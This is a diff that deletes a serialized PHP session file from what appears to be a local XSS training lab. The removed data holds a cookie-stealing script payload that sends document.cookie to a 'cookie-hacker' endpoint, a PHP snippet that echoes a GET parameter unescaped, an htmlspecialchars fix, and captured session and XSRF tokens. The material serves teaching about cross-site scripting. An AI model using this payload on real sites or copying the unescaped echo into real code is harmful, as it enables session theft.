@@ -1,5 +1,0 @@
-a:8:{s:9:"_previous";a:1:{s:3:"url";s:41:"http://localhost/action/xss/reflected-xss";}s:6:"_flash";a:2:{s:3:"old";a:0:{}s:3:"new";a:0:{}}s:6:"_token";s:40:"9WSmmOS3JIQr7kui1lM6y1Wi0Poru3zNplZlhWYe";s:50:"login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d";i:11;s:10:"codeHacker";s:59:"if(isset($_GET['cookie'])){
-    return $_GET['cookie'];
-}";s:6:"script";s:99:"<script>window.open('http://localhost/action/xss/cookie-hacker?
-cookie='+document.cookie);<script>";s:6:"cookie";s:339:"XSRF-TOKEN=eyJpdiI6InpQcThIbnRMNXBvbGtjUXFQNEJVSFE9PSIsInZhbHVlIjoiaWdLWGI2anBSSGQrYTY0WlJuR2Nsd0l1UFJMWU1aYjFqUC9rSUJrMnBocmthNC9TanZ3VGYwY3dXRjk5SDdXajZaZHZneHEybm9TZk1rcm90RkZiOE9JNDE1ZzdjZkRqMmd0MGF3aTA3UUU3Zk40aU04NzdFcDFmNFJaVU9ZR3UiLCJtYWMiOiJiOGM3MDBhYzVkZGYyYTJmNTA4YmQ2ODZkYWViNmMyYTkwMDc3ZjI0NzhlNDhjOGQxNDgxY2Y5ODI0YWMwMWE4In0=";s:11:"codePrevent";s:73:"if(isset($_GET['search']))
-    return htmlspecialchars($_GET['search']);";}
